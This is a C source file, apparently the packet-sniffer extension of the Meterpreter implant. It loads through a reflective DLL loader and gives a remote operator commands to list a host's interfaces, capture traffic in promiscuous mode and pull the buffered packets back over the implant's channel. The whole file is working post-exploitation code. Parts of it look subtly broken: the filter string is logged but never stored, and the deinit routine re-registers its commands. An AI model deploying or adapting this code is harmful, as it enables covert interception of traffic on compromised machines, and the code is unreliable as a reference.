/*!
 * @file sniffer.c
 * @brief Definition for packet capture functionality.
 */

#define _CRT_SECURE_NO_DEPRECATE 1

#include "precomp.h"
#include "sniffer.h"

DWORD request_sniffer_interfaces(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_start(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_release(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet);
DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet);

/*! @brief List of custom commands provided by the sniffer extension. */
Command customCommands[] =
{
	COMMAND_REQ("sniffer_interfaces", request_sniffer_interfaces),
	COMMAND_REQ("sniffer_capture_start", request_sniffer_capture_start),
	COMMAND_REQ("sniffer_capture_stop", request_sniffer_capture_stop),
	COMMAND_REQ("sniffer_capture_stats", request_sniffer_capture_stats),
	COMMAND_REQ("sniffer_capture_release", request_sniffer_capture_release),
	COMMAND_REQ("sniffer_capture_dump", request_sniffer_capture_dump),
	COMMAND_REQ("sniffer_capture_dump_read", request_sniffer_capture_dump_read),
	COMMAND_TERMINATOR
};



// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

int sniffer_includeports[1024];
int sniffer_excludeports[1024];

void __stdcall sniffer_receive(DWORD_PTR Param, DWORD_PTR ThParam, HANDLE hPacket, LPVOID pPacketData, DWORD IncPacketSize);

const char* inet_ntop(int af, const void* src, char* dst, int cnt){

	struct sockaddr_in srcaddr;

	memset(&srcaddr, 0, sizeof(struct sockaddr_in));
	memcpy(&(srcaddr.sin_addr), src, sizeof(srcaddr.sin_addr));

	srcaddr.sin_family = af;
	if (WSAAddressToString((struct sockaddr*) &srcaddr, sizeof(struct sockaddr_in), 0, dst, (LPDWORD)&cnt) != 0) {
		DWORD rv = WSAGetLastError();
		return NULL;
	}
	return dst;
}


struct iface_entry {
	unsigned char name;
	unsigned char hwaddr[ETH_ADDR_LEN];
	uint32_t mtu;
	uint32_t index;
	unsigned char flags[101];
	int addr_count;
	struct iface_address *addr_list;
};

char *get_interface_name_by_index(unsigned int fidx)
{
	unsigned int idx;
	char errbuf[PCAP_ERRBUF_SIZE+4];
	static char device_name[64];				// PKS, probably safe, due to snifferm mutex
	pcap_if_t *interfaces, *int_iter;


	interfaces = int_iter = NULL;
	idx = 1;

	memset(device_name, 0, sizeof(device_name));

	if(pcap_findalldevs(&interfaces, errbuf) == -1)
	{
		dprintf("pcap_findalldevs failed, errbuf was : %s", errbuf);
		return NULL;
	}
	else
	{ //pcap_findalldevs suceeded
		for(int_iter = interfaces; int_iter; int_iter = int_iter->next)
		{
			if(fidx == idx++)
			{
				strncpy(device_name, int_iter->name, sizeof(device_name)-1);
				break;
			}
		}
	}

	if (interfaces)
	{
		pcap_freealldevs(interfaces);
	}

	return device_name[0] ? device_name : NULL;

}

// http://www.google.com/#q=peter+packet

typedef struct PeterPacket
{
	struct pcap_pkthdr h;
	u_char bytes[0];
} PeterPacket;

char *packet_filter;

#define PktDestroy(x) free((void *)(x))
#define PktGetPacketSize(x) (((PeterPacket *)(x))->h.caplen)

DWORD PktGetId(void *handle, DWORD *thi)
{
	PeterPacket *pp = (PeterPacket *)(handle);
	*thi = pp->h.ts.tv_sec;
	return pp->h.ts.tv_usec;
}

DWORD PktGetTimeStamp(void *handle, DWORD *thi)
{
	__int64 i64;
	PeterPacket *pp = (PeterPacket *)(handle);

	i64 = (pp->h.ts.tv_sec + 11644473600) * 10000000;

	*thi = (i64 & 0xffffffff00000000) >> 32;
	return (i64 & 0x00000000ffffffff);
}

#define PktGetPacketData(x) (&((PeterPacket *)(x))->bytes)

#define SnifferCfgGetMaxPacketSize(x) (1514)

struct sockaddr peername;
int peername_len;

struct sockaddr_in *peername4;
struct sockaddr_in6 *peername6;

/* mutex */
CRITICAL_SECTION snifferm;
#define SNIFFER_MAX_INTERFACES 128 // let's hope interface index don't go above this value
#define SNIFFER_MAX_QUEUE  200000 // ~290Mb @ 1514 bytes

CaptureJob open_captures[SNIFFER_MAX_INTERFACES];

DWORD request_sniffer_interfaces(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	Tlv entries[8];

	/*
		0: Index
		1: Name
		2: Description
		3: Type
		4: MTU
		5: Wireless?
		6: Accessible?
		7: DHCP?
		*/
	DWORD result = ERROR_SUCCESS;

	char errbuf[PCAP_ERRBUF_SIZE+4];
	int aidx = htonl(1);				// :~(

	int yes_int = htonl(1);
	int no_int = 0;
	int mtu_int = htonl(1514);

	pcap_if_t *interfaces, *int_iter;

	interfaces = int_iter = NULL;

	do
	{
		result = pcap_findalldevs(&interfaces, errbuf);

		if(!result)
		{ // pcap_findalldevs suceeded
			for(int_iter = interfaces; int_iter; int_iter = int_iter->next)
			{
				entries[0].header.type   = TLV_TYPE_UINT;
				entries[0].header.length = sizeof(unsigned int);
				entries[0].buffer        = (PUCHAR)&aidx;

				entries[1].header.type   = TLV_TYPE_STRING;
				entries[1].header.length = (DWORD)strlen(int_iter->name)+1;
				entries[1].buffer        = (PUCHAR)int_iter->name;

				entries[2].header.type   = TLV_TYPE_STRING;
				entries[2].header.length = (DWORD)strlen(int_iter->description)+1;
				entries[2].buffer        = (PUCHAR)int_iter->description;

				entries[3].header.type   = TLV_TYPE_UINT;
				entries[3].header.length = sizeof(unsigned int);
				entries[3].buffer        = (PUCHAR)&no_int;		// xxx, get encapsulation type?

				entries[4].header.type   = TLV_TYPE_UINT;
				entries[4].header.length = sizeof(unsigned int);
				entries[4].buffer        = (PUCHAR)&mtu_int;		// PKS :-(

				entries[5].header.type   = TLV_TYPE_BOOL;
				entries[5].header.length = sizeof(BOOL);
				entries[5].buffer        = (PUCHAR)&no_int;		// check encaps options / crap

				entries[6].header.type   = TLV_TYPE_BOOL;
				entries[6].header.length = sizeof(BOOL);
				entries[6].buffer        = (PUCHAR)&yes_int;		// sure, why not.

				entries[7].header.type   = TLV_TYPE_BOOL;
				entries[7].header.length = sizeof(BOOL);
				entries[7].buffer        = (PUCHAR)&no_int;		// hrm. not worth it.

				packet_add_tlv_group(response, TLV_TYPE_SNIFFER_INTERFACES, entries, 8);
				aidx = htonl(ntohl(aidx)+1);	// :~(
			}
		}
		else
		{
			dprintf("pcap_findalldevs() failed, errbuf was %s", errbuf);
			break;
		}

	} while(0);


	if (interfaces)
	{
		pcap_freealldevs(interfaces);
	}


	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


void sniffer_handler(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
	dprintf("sniffer>> sniffer_handler()\n");
	CaptureJob *j = (CaptureJob *)(user);
	PeterPacket *pkt;

	if(! j->active)
	{
		dprintf("sniffer>> sniffer_handler() calling pcap_breakloop because job is no longer active");
		pcap_breakloop(j->pcap);
		return;
	}

	pkt = calloc(sizeof(PeterPacket) + h->caplen, 1);
	if(! pkt)
	{
		dprintf("sniffer>> sniffer_handler() ho hum, no memory. maybe a pcap_breakloop / stop running?");
		return;
	}

	memcpy(&(pkt->h), h, sizeof(struct pcap_pkthdr));
	memcpy(&(pkt->bytes), bytes, h->caplen);

	// PKS, so tempted to implement per job locks.
	// must fight temptation. :-)

	// could be interesting to try and find a lockless way of implementing it.
	// though the j->idx_pkts >= j->max_pkts is annoying :p

	lock_acquire(snifferm);

	j->cur_pkts ++;
	j->cur_bytes += h->caplen;

	if(j->idx_pkts >= j->max_pkts) j->idx_pkts = 0;

	if(j->pkts[j->idx_pkts])
	{
		j->cur_pkts--;
		j->cur_bytes -= ((PeterPacket *)(j->pkts[j->idx_pkts]))->h.caplen;
		free((void*)(j->pkts[j->idx_pkts]));
	}

	j->pkts[j->idx_pkts++] = pkt;

	lock_release(snifferm);

	dprintf("sniffer>> sniffer_handler() new packet inserted. now pkts %d / bytes %d", j->cur_pkts, j->cur_bytes);

}


DWORD WINAPI sniffer_thread(LPVOID jParam)
{
	dprintf("sniffer>> sniffer_thread()\n");
	int count = 0;
	CaptureJob *j = (CaptureJob *)(jParam);
	// PeterPacket *pkt;

	while (j->active)
	{
		dprintf("sniffer>> sniffer_thread() job is active, at start of loop\n");
		//count = pcap_next_ex(j->pcap, &pkt->h, &pkt->bytes);
		//sniffer_handler((u_char *)(j), &pkt->h, &pkt->bytes);
		count = pcap_dispatch(j->pcap, 100, sniffer_handler, (u_char *)(j));
		dprintf("sniffer>> sniffer_thread()  count %d\n", count);

		if (-1 == count)
		{
			dprintf("pcap error: %s", pcap_geterr(j->pcap));
		}

		if (count <= 0)
		{
			continue;
		}

		if (count)
		{
			dprintf("dispatched %d packets", count);
		}
	}

	dprintf("and we're done");
	return 0;
}

#define min(a,b) (((a) < (b)) ? (a) : (b))
#define max(a,b) (((a) > (b)) ? (a) : (b))

//#endif

DWORD request_sniffer_capture_start(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	unsigned int maxp;
	CaptureJob *j;
	DWORD result;
	unsigned int ifh;

	char errbuf[PCAP_ERRBUF_SIZE+4];
	char *name;
	dprintf("sniffer>> start_capture()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	maxp = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_PACKET_COUNT);
	maxp = min(maxp, SNIFFER_MAX_QUEUE);
	maxp = max(maxp, 1);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		ifh = ifid;
		j = &open_captures[ifid];

		// the interface is already being captured
		if (j->active)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		name = get_interface_name_by_index(ifh);
		dprintf("sniffer>> start_capture() name is %s\n",name);

		if(!name)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}
		j->pcap = pcap_open_live(name,
			65535,
			PCAP_OPENFLAG_PROMISCUOUS|PCAP_OPENFLAG_NOCAPTURE_LOCAL|PCAP_OPENFLAG_MAX_RESPONSIVENESS,
			1000,
			errbuf
		);
		if(!j->pcap)
		{
			dprintf("sniffer>> start_capture() interface acquisition failed: %s\n", errbuf);
			result = ERROR_ACCESS_DENIED;
			break;
		}
		j->capture_linktype = pcap_datalink(j->pcap);
		dprintf("sniffer>> start_capture() linktype is %d\n", j->capture_linktype);
		if (-1 == j->capture_linktype)
		{
			j->capture_linktype = 1; // force to LINKTYPE_ETHERNET in case of error
		}

		if(packet_filter)
		{
			struct bpf_program bpf;
			char *add_filter;
			char *real_filter = NULL;
			int rc;

			dprintf("handling packet_filter");

			add_filter = packet_get_tlv_value_string(packet, TLV_TYPE_SNIFFER_ADDITIONAL_FILTER);

			dprintf("add_filter = %p (%s)", add_filter, add_filter ? add_filter : "");

			if(add_filter)
			{
				dprintf("%s and (%s)", packet_filter, add_filter);
			}
			else
			{
				real_filter = _strdup(packet_filter);
			}

			dprintf("the real filter string we'll be using is '%s'", real_filter);

			rc = pcap_compile(j->pcap, &bpf, real_filter, 1, 0);

			if(rc == -1)
			{
				dprintf("pcap compile reckons '%s' is a failure because of '%s'",
					real_filter, pcap_geterr(j->pcap));

				result = ERROR_INVALID_PARAMETER;
				break;
			}
			free(real_filter);

			dprintf("compiled filter, now setfilter()'ing");

			rc = pcap_setfilter(j->pcap, &bpf);
			pcap_freecode(&bpf);

			if(rc == -1)
			{
				dprintf("can't set filter because '%s'", pcap_geterr(j->pcap));

				result = ERROR_INVALID_PARAMETER;
				break;
			}

			dprintf("filter applied successfully");
		}
		j->thread = CreateThread(NULL, 0, sniffer_thread, (u_char*)j, 4, NULL);
		if(! j->thread)
		{
			dprintf("sniffer>> start_capture() thread creation failed!\n");
			pcap_close(j->pcap);
			break;
		}
		dprintf("sniffer>> start_capture() thread creation succeeded\n");
		j->pkts = calloc(maxp, sizeof(*(j->pkts)));
		if (j->pkts == NULL) {
			dprintf("sniffer>> start_capture()  pkts allocation failed!\n");
			pcap_close(j->pcap);
			result = ERROR_ACCESS_DENIED;
			break;
		}
		dprintf("sniffer>> start_capture() pkts allocation succeeded\n");
		j->active = 1;
		j->intf = ifid;
		j->max_pkts = maxp;
		j->cur_pkts = 0;
		j->mtu = SnifferCfgGetMaxPacketSize(j->pcap);

		dprintf("sniffer>> start_capture() mtu set: %d\n", j->mtu);
		ResumeThread(j->thread);
		dprintf("sniffer>> start_capture() thread running\n");

	} while (0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stop(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	dprintf("sniffer>> stop_capture()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> stop_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
		if (!j->pcap)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		lock_acquire(snifferm);

		j->active = 0;
		WaitForSingleObject(j->thread,5000);
		TerminateThread(j->thread,0);

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);

		lock_release(snifferm);

		dprintf("sniffer>> stop_capture() interface %d processed %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);
	} while (0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_release(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid, i;
	CaptureJob *j;
	DWORD result;
	BOOL test_parameters;

	dprintf("sniffer>> release_capture()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> release_capture(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface is not being captured
		test_parameters = !j->pcap || j->active == 1;
		if (test_parameters)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		lock_acquire(snifferm);

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);
		dprintf("sniffer>> release_capture() interface %d released %d packets/%d bytes", j->intf, j->cur_pkts, j->cur_bytes);

		for (i = 0; i < j->max_pkts; i++)
		{
			if (!j->pkts[i]) break;

			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}

		free(j->pkts);
		memset(j, 0, sizeof(CaptureJob));

		lock_release(snifferm);


	} while (0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_stats(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	CaptureJob *j;
	DWORD result;

	dprintf("sniffer>> capture_stats()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_stats(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
		if (!j->pcap)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		lock_acquire(snifferm);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, j->cur_pkts);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, (unsigned int)j->cur_bytes);
		lock_release(snifferm);
	} while (0);

	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

DWORD request_sniffer_capture_dump_read(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid, i;
	unsigned int bcnt;
	CaptureJob *j;
	DWORD result;

	dprintf("sniffer>> capture_dump_read()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	bcnt = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_BYTE_COUNT);
	bcnt = min(bcnt, 32 * 1024 * 1024);

	dprintf("sniffer>> capture_dump_read(0x%.8x, %d)", ifid, bcnt);

	result = ERROR_SUCCESS;

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		j = &open_captures[ifid];

		if (!j->dbuf)
		{
			packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, 0);
			goto fail;
		}

		if (j->didx + bcnt > j->dlen)
		{
			bcnt = j->dlen - j->didx;
		}

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, bcnt);
		packet_add_tlv_raw(response, TLV_TYPE_SNIFFER_PACKET, (unsigned char *)j->dbuf + j->didx, bcnt);
		j->didx += bcnt;
	} while (0);

	// Free memory if the read is complete
	if (j->didx >= j->dlen - 1)
	{
		free(j->dbuf);
		j->dbuf = NULL;
		j->didx = 0;
		j->dlen = 0;
		// if dump occurs when interface is not active, i.e sniff has ended, release info
		if (j->active == 0)
		{
			dprintf("sniffer>> capture_dump_read, release CaptureJob");
			lock_acquire(snifferm);
			for (i = 0; i < j->max_pkts; i++)
			{
				if (!j->pkts[i]) break;
				PktDestroy(j->pkts[i]);
				j->pkts[i] = NULL;
			}

			free(j->pkts);
			memset(j, 0, sizeof(CaptureJob));
			lock_release(snifferm);
		}
	}

fail:
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


DWORD request_sniffer_capture_dump(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	unsigned int ifid;
	unsigned int rbuf, mbuf;
	unsigned int *tmp;

	CaptureJob *j;
	DWORD result, pcnt, rcnt, i;
	DWORD thi, tlo;

	dprintf("sniffer>> capture_dump()");

	ifid = packet_get_tlv_value_uint(packet, TLV_TYPE_SNIFFER_INTERFACE_ID);
	dprintf("sniffer>> capture_dump(0x%.8x)", ifid);

	result = ERROR_SUCCESS;

	lock_acquire(snifferm);

	do
	{
		// the interface is invalid
		if (ifid == 0 || ifid >= SNIFFER_MAX_INTERFACES)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		j = &open_captures[ifid];

		// the interface was not captured
		if(! j->pcap)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Free any existing packet buffer
		if (j->dbuf)
		{
			free(j->dbuf);
			j->dbuf = NULL;
			j->dlen = 0;
			j->didx = 0;
		}

		// Add basic stats
		pcnt = 0;
		rcnt = 0;

		mbuf = (1024 * 1024);
		j->dbuf = malloc(mbuf);
		rbuf = 0;

		for (i = 0; i < j->max_pkts; i++)
		{
			if (!j->pkts[i]) break;

			rbuf += (8 + 8 + 4 + PktGetPacketSize(j->pkts[i]));
			if (mbuf < rbuf)
			{
				mbuf += (1024 * 1024);
				j->dbuf = realloc(j->dbuf, mbuf);

				if (!j->dbuf)
				{
					dprintf("sniffer>> realloc of %d bytes failed!", rbuf);
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
			}

			tmp = (unsigned int *)(j->dbuf + rcnt);
			tlo = PktGetId(j->pkts[i], &thi);
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

			tlo = PktGetTimeStamp(j->pkts[i], &thi);
			*tmp = htonl(thi); tmp++;
			*tmp = htonl(tlo); tmp++;

			tlo = PktGetPacketSize(j->pkts[i]);
			*tmp = htonl(tlo); tmp++;

			memcpy(j->dbuf + rcnt + 20, PktGetPacketData(j->pkts[i]), tlo);

			rcnt += 20 + tlo;
			pcnt++;

			PktDestroy(j->pkts[i]);
			j->pkts[i] = NULL;
		}

		j->dlen = rcnt;

		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_PACKET_COUNT, pcnt);
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_BYTE_COUNT, rcnt);
		// add capture datalink, needed when saving capture file, use TLV_TYPE_SNIFFER_INTERFACE_ID not to create a new TLV type
		packet_add_tlv_uint(response, TLV_TYPE_SNIFFER_INTERFACE_ID, j->capture_linktype);

		dprintf("sniffer>> finished processing packets");

		j->cur_bytes = 0;
		j->cur_pkts = 0;
		j->idx_pkts = 0;
	} while (0);

	lock_release(snifferm);
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	// This handle has to be set before calls to command_register
	// otherwise we get obscure crashes!
	hMetSrv = remote->met_srv;

	dprintf("[SERVER] Registering command handlers...");
	command_register_all( customCommands );

	dprintf("[SERVER] Memory reset of open_captures...");
	memset(open_captures, 0, sizeof(open_captures));

	dprintf("[SERVER] Getting the peer name of our socket...");
	// get the address/port of the connected control socket
	peername4 = NULL;
	peername6 = NULL;
	peername_len = sizeof(peername);
	if (remote->transport->get_handle) {
		getpeername(remote->transport->get_handle(remote->transport), &peername, &peername_len);
		if(peername.sa_family == PF_INET)  peername4 = (struct sockaddr_in *)&peername;

		dprintf("[SERVER] Getting the IPv6 peer name of our socket...");
		if(peername.sa_family == PF_INET6) peername6 = (struct sockaddr_in6 *)&peername;
	}
	else {
	 // TODO: not sure what to do here
	}

	dprintf("[SERVER] Creating a lock...");
	InitializeCriticalSection(&snifferm);

	if(peername4 || peername6) {
		int port;
		char buf[256];		// future proof :-)

		memset(buf, 0, sizeof(buf));

		if(peername4) {
			inet_ntop(AF_INET, &peername4->sin_addr, buf, sizeof(buf)-1);
			port = ntohs(peername4->sin_port);
		} else {
			inet_ntop(AF_INET6, &peername6->sin6_addr, buf, sizeof(buf)-1);
			port = ntohs(peername6->sin6_port);
		}

		dprintf("not (ip%s host %s and tcp port %d)", peername4 ? "" : "6", buf, port);
		dprintf("so our filter is '%s'", packet_filter);
	} else {
		dprintf("hold on to your seats. no filter applied :~(");
	}

	return ERROR_SUCCESS;

}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_register_all( customCommands );

	if(packet_filter) {
		free(packet_filter);
		packet_filter = NULL;
	}

	lock_destroy(snifferm);
	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "sniffer", bufferSize - 1);
	return ERROR_SUCCESS;
}
